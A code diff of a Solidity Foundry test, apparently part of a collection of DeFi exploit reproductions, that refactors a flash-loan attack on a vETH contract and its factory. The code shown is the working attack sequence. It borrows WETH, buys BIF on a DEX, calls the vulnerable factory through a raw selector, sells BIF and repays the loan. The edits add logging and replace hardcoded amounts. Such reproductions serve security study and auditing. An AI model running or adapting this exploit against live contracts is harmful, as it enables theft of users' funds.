@@ -61,9 +61,10 @@ contract vETH_exp is BaseTestWithBalanceLog {
         uint256[] memory feeAmounts,
         bytes memory userData
     ) external {
+        console2.log("Borrowed WETH: %18e ether", borrowed_eth); // 32560.203560896180352774 ether
         WETH_TOKEN.withdraw(borrowed_eth);
         // buy BIF
-        DEX_INTERFACE.call{value: 32560.203560896180352774 ether}(
+        DEX_INTERFACE.call{value: borrowed_eth}(
             abi.encodeWithSignature("buyQuote(address,uint256,uint256)", address(BIF), borrowed_eth, 0));
         uint256 bif_balance = BIF.balanceOf(address(this));
         console2.log("BIF balance before exploit: ", bif_balance);
@@ -71,7 +72,7 @@ contract vETH_exp is BaseTestWithBalanceLog {
         // exploit vulnerability in factory
         BIF.approve(VULN_FACTORY, bif_balance);
         VULN_FACTORY.call(
-            abi.encodeWithSelector(0x6c0472da, address(vETH), address(BIF), 0x1043561a8829300000, 0, 0, 0)
+            abi.encodeWithSelector(0x6c0472da, address(vETH), address(BIF), 300 ether, 0, 0, 0)
         );
 
         bif_balance = BIF.balanceOf(address(this));
@@ -79,7 +80,8 @@ contract vETH_exp is BaseTestWithBalanceLog {
 
         // sell BIF
         BIF.approve(DEX_INTERFACE, bif_balance);
-        DEX_INTERFACE.call(abi.encodeWithSignature("sellQuote(address,uint256,uint256)", address(BIF), 6378941079150051291618297, 0));
+        DEX_INTERFACE.call(
+            abi.encodeWithSignature("sellQuote(address,uint256,uint256)", address(BIF), 6378941079150051291618297, 0));
 
         // repay flashloan
         WETH_TOKEN.deposit{value: borrowed_eth}();
